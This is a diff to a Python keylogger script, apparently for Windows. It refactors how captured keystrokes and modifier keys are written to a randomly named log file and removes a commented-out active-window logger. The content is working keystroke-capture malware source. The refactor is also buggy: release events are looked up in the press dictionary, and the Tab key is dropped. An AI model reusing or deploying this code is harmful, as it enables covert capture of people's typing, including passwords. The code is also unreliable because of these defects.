@@ -11,19 +11,34 @@ from win32gui import GetWindowText, GetForegroundWindow
 # generate a random filename for our log file
 fname = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10)) + ".txt"
 
-"""
-def windowlog():
-    # watch our current active window and write to our log file if it changes
-    currentwindow = (GetWindowText(GetForegroundWindow()))
-    while True:
-        checkwindow = (GetWindowText(GetForegroundWindow()))
-        if currentwindow != checkwindow:
-            with open(fname, "a+") as f:
-                f.write(f"\n### Window Changed to {checkwindow} ###\n")
-            currentwindow = checkwindow
-"""
 
 def log():
+    # print statements for when mods are used
+    mods = {
+        "Key.space": " {sp} ",
+        "Key.backspace": " {bsp} ",
+        "Key.enter": " {ent} ",
+        "Key.caps_lock": " {cLok} ",
+        "Key.delete": " {del} ",
+        "Key.ctrl_l": " {lctrl} ",
+        "Key.ctrl_r": " {rctrl} ",
+        "Key.alt_l": " {lalt}",
+        "Key.alt_r": " {ralt}",
+        "Key.shift": " {sft} ",
+        "Key.cmd": " {cmd} ",
+    }
+    # print statements for when mods are released
+    mods_r = {
+        "Key.delete": " {del_r} ",
+        "Key.ctrl_l": " {lctrl_r} ",
+        "Key.ctrl_r": " {rctrl_r} ",
+        "Key.shift": " {sft_r} ",
+        "Key.alt": " {alt_r} ",
+        "Key.alt_l": " {lalt_r}",
+        "Key.alt_r": " {ralt_r}",
+        "Key.alt_gr": " {altgr_r} ",
+        "Key.cmd": " {cmd_r} ",
+    }
 
     def on_press(key):
         global currentwindow
@@ -51,42 +66,16 @@ def log():
     def log_file_release(klr):
         with open(fname, "a+") as f:
             for key in klr:
-                if "Key.cmd" in key:
-                    f.write(" {cmd_r} ")
-                elif "Key.ctrl_l" in key:
-                    f.write(" {lctrl_r} ")
-                elif "Key.ctrl_r" in key:
-                    f.write(" {rctrl_r} ")
-                elif "Key.alt_gr" in key:
-                    f.write(" {altgr_r} ")
-                elif "Key.alt" in key:
-                    f.write(" {alt_r} ")
-                elif "Key.shift" in key:
-                    f.write(" {sft_r} ")
+                if key in mods_r:
+                    f.write(str(mods.get(key)))
                 else:
                     continue
 
     def log_file(kl):
         with open(fname, "a+") as f:
             for key in kl:
-                if "Key.space" in key:
-                    f.write(" {sp} ")
-                elif "Key.backspace" in key:
-                    f.write(" {bsp} ")
-                elif "Key.enter" in key:
-                    f.write(" {ent} ")
-                elif "Key.tab" in key:
-                    f.write(" {tab} ")
-                elif "Key.caps_lock" in key:
-                    f.write(" {cLok} ")
-                elif "Key.delete" in key:
-                    f.write(" {del} ")
-                elif "Key.ctrl_l" in key:
-                    f.write(" {lctrl} ")
-                elif "Key.ctrl_r" in key:
-                    f.write(" {rctrl} ")
-                elif "Key.shift" in key:
-                    f.write(" {sft} ")
+                if key in mods:
+                    f.write(str(mods.get(key)))
                 else:
                     f.write(key)
 
